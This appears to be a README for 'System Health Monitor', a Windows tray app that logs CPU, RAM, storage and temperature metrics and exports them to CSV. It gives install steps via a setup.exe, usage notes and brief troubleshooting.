# System Health Monitor

## Overview

The **System Health Monitor** is a lightweight desktop application designed to provide real-time monitoring of your system's health. It tracks various system metrics such as:

- **CPU Usage**  
- **RAM Usage**  
- **Storage Usage**  
- **CPU Temperature**  
- **Disk Temperature**

The application sits in your **System Tray** and continuously monitors and logs these metrics. It also allows you to export your system logs to a CSV file for further analysis.

## Features

- **Real-time Monitoring**: Continuously tracks system metrics like CPU usage, RAM usage, storage percentage, CPU temperature, and disk temperature.
- **System Tray Support**: The app runs in the background with an icon in your system tray, keeping it out of sight but easily accessible.
- **Logging**: System metrics are logged at regular intervals.
- **CSV Export**: Export logs to a CSV file for further analysis or record-keeping.

## How to Install and Run the Application

1. **Download the ZIP File**  
   Download the zip file containing the **System Health Monitor** application from the release page.

2. **Extract the ZIP File**  
   Once the download is complete, extract the contents of the zip file to a location on your computer.

3. **Install the Application**  
   - Open **File Explorer** and navigate to the folder where you extracted the zip file.
   - Inside the extracted folder, locate and double-click the `SystemHealthInstaller` folder.
   - In the `SystemHealthInstaller` folder, double-click `setup.exe` to start the installation process.

4. **Run the Application**  
   After installation, the app will automatically sit in your **System Tray**, monitoring and logging your system’s health metrics. You can right-click the tray icon for options like showing the metrics window or exiting the application.

## How to Use the Application

Once the application is running, it will continuously monitor and log your system’s health metrics in the background. The data can be accessed via the system tray icon or by opening the metrics window.

### Key Metrics Displayed:

- **CPU Usage**: Percentage of CPU being used.
- **RAM Usage**: Amount of RAM in use (in MB).
- **Storage Usage**: Percentage of used storage on your primary drive (usually C:).
- **CPU Temperature**: Current temperature of your CPU (in Celsius).
- **Disk Temperature**: Current temperature of your primary disk (in Celsius).

### Exporting Logs

You can export the logged data into a CSV file for analysis:

- Right-click the tray icon and select **Export to CSV** to generate the CSV file.
- The exported file will be saved to the logs directory.

## Troubleshooting

- **Cannot Find the `setup.exe`**: If you cannot find the `setup.exe` file after extracting the ZIP, make sure you've extracted all files correctly and that no files were blocked by your antivirus.
- **App Not Running in Tray**: If the app does not show up in the system tray after installation, ensure that it's not being blocked by antivirus software or Windows Defender.

## License

This project is licensed under the MIT License.
